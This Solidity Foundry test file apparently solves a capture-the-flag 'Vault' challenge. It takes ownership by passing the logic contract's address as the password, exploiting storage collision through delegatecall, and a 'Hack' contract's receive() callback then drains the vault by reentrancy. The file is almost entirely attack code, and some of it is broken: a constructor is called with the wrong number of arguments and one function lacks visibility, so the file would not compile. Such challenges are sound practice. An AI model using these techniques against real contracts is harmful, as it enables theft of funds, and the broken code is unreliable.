// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

interface Ivalue {
    function isSolve() external view returns (bool);

    function noMethod() external;
}

contract Hack {
    address vaultLogic;
    address owner;

    constructor(address _vaultLogic, address _owner) {
        vaultLogic = _vaultLogic;
        owner = _owner;
    }

    receive() external payable {
        console.log("Hack contract receive ether");
        if (!Ivalue(vaultLogic).isSolve()) {
            vaultLogic.call(abi.encodeWithSignature("withdraw()"));
            console.log("Hack contract withdraw ether");
        }
    }

    function hack() public {
        (bool success, ) = address(vaultLogic).call{value: 0.1 ether}(
            abi.encodeWithSignature("deposite()")
        );
        (bool withdrawSuccess, ) = address(vaultLogic).call(
            abi.encodeWithSignature("withdraw()")
        );
    }

    function withdraw() {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    Hack public hack;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));
        hack = new Hack(address(vault));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.deal(address(hack), 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        {
            bytes32 passWord = bytes32(uint256(uint160(address(logic))));
            address(vault).call(
                abi.encodeWithSignature(
                    "changeOwner(bytes32,address)",
                    passWord,
                    address(palyer)
                )
            );
            vault.openWithdraw();
            hack.hack();
        }

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
